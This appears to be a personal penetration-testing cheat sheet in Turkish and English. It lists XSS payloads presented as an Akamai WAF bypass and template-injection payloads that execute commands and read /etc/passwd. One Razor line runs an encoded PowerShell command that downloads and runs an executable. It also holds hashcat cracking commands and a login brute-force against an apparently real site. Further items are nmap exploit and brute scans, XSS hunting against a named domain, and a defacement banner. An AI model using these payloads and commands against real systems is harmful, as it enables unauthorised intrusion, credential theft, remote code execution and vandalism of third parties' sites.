# manuel

# akamai xss bypass 

```
<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;</font>
```
```
<A HREF="https://www.cia.gov/">Login Here </A>
```
```
<button onClick="alert('xss')">Submit</button>
```
```
"'>"<A HRef=" AutoFocus OnFocus=top//? >
```
```
"'>"<A HRef=" AutoFocus OnFocus=top//?['ale'%2B'rt'](document%2Bcookie)>
```
________
```
<iframe src="https://www.cia.gov" width="100%" height="500"></iframe>

```
______________________________
# Offensive payload
```
git clone https://github.com/InfoSecWarrior/Offensive-Payloads.git 
```
_____________________________

### link-gopher : Web sitesindeki linkleri cikartir tek tek elle kopyala yapistir yapmazsin
______________________________

# hashcat icin wordlist
```
https://packetstormsecurity.com/Crackers/wordlists/page1/
```
```
https://labs.nettitude.com/tools/rocktastic/
```
```
https://github.com/J3rryBl4nks/PasswordCrackingMethodology
```
```
hashcat -m 300 -a 0 -o hashcikti3a.txt hashes5k.txt weakpass_3a/weakpass_3a
```


____________________________
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt --url 192.168.56.116
```
```
echo "http://arkas.com.tr" | waybackurls | gf xss | xargs -I {} injectx.py -u {}
```
```
wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/seclists/Passwords/darkweb2017-top100.txt --hc 200 -d "username=FUZZ&password=FUZ2Z" https://www.kamyonum.com.tr/edit/login.asp 
```
```
nmap -Pn -n --top-ports 5000 13.40.217.134 -sV -sC --version-all --script=vuln --script=auth --script=http-brute,snmp-brute --script=exploit --script=malware -o nmapExploitScan
```

```
<h1><A HREF="https://cia.gov/"><marquee>YOU HAVE BEEN HACKED by DedCrowd</marquee> </A>
```
```
https://github.com/reddelexc/hackerone-reports
```
____________________________
## SSTI 
```
java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
```
Ruby
{ 7 * 7 }
{ %x|env| }
Jinja2 Python
{{7*7}} = Error
${7*7} = ${7*7}
{{foobar}} Nothing
{{4*4}}[[5*5]]
{{7*'7'}} = 7777777
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}
<div data-gb-custom-block data-tag="debug"></div>
```

```
Moka Python
<%
import os
x=os.popen('id').read()
%>
${x}
```

```
Razor (.Net)
@(2+2) <= Success
@() <= Success
@("{{code}}") <= Success
@ <=Success
@{} <= ERROR!
@{ <= ERRROR!
@(1+2)
@( //C#Code )
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");
```
# ssti payloads
```
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
*{7*7}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
```


